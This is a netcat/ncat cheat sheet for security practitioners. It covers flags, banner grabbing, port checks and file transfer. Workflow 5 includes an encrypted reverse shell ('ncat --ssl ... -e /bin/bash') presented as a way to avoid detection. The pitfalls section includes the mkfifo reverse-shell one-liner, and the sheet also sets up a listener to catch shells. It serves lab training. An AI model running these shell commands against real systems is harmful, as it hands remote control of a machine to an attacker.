# Netcat (`nc` / `ncat`) — The TCP/UDP Swiss Army Knife

> **TL;DR:** Netcat reads and writes data across raw TCP or UDP connections. Security practitioners use it for **catching reverse shells**, **banner grabbing**, **quick port checks**, and **simple file transfers**.

---

## Installation & Variants
- `nc` (Traditional / OpenBSD netcat) — pre-installed on Kali and most Linux distros.
- `ncat` (Nmap's modern replacement) — supports `--ssl` encryption and `--allow` IP filtering.

```bash
sudo apt install -y netcat-traditional ncat
```

---

## Essential Flags Reference

| Flag | Description |
|------|-------------|
| `-l` | Listen mode (wait for incoming connections) |
| `-v` | Verbose output (shows connection status and errors) |
| `-n` | Numeric-only IP addresses (skip DNS resolution — faster & avoids DNS leaks) |
| `-p <port>` | Local port to listen on |
| `-u` | Use **UDP** instead of default TCP |
| `-z` | Zero-I/O mode (scan for listening ports without sending data) |
| `-w <sec>` | Connection timeout in seconds |
| `-e <prog>` | Execute program after connecting (e.g., `/bin/bash` — available in `nc.traditional` & `ncat`, **disabled** in OpenBSD `nc`) |

---

## Step-by-Step Practical Workflows

### 1. Start a Reverse Shell Listener
Always use `-lvnp` (Listen, Verbose, No-DNS, Port). Wrapping with `rlwrap` gives you command history and arrow keys:
```bash
rlwrap nc -lvnp 4444
```

### 2. Banner Grabbing (Manual Service Fingerprinting)
Connect to a port and see what the service announces (or send an HTTP request manually):
```bash
nc -nv 10.10.10.5 22
# For HTTP:
printf "HEAD / HTTP/1.0\r\n\r\n" | nc -nv 10.10.10.5 80
```

### 3. Quick Port Check (When `nmap` Isn't Available)
```bash
nc -zv -w 2 10.10.10.5 20-25 80 443 3306
```

### 4. Simple File Transfer Between Two Hosts
```bash
# Receiver (Target): listen and write incoming bytes to file
nc -lvnp 9001 > received_tool.sh

# Sender (Attacker): send file to receiver
nc -nv 10.10.10.5 9001 < local_tool.sh
```

### 5. Encrypted Listener with `ncat` (Avoids Cleartext Detection)
```bash
# Listener
ncat --ssl -lvnp 4444
# Client
ncat --ssl 10.10.14.5 4444 -e /bin/bash
```

---

## Common Pitfalls & Defensive Notes
- **`nc -e` Missing on Modern Ubuntu/Debian:** OpenBSD `nc` removed `-e` for security. Use a named pipe (`mkfifo`) workaround if `nc -e` fails:
  ```bash
  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
  ```
- **Defensive Tip:** `nc` traffic is **unencrypted** by default (plaintext commands & output). IDS/EDR tools alert heavily on `nc -e` or `/dev/tcp` connections; restrict outbound egress ports on servers.
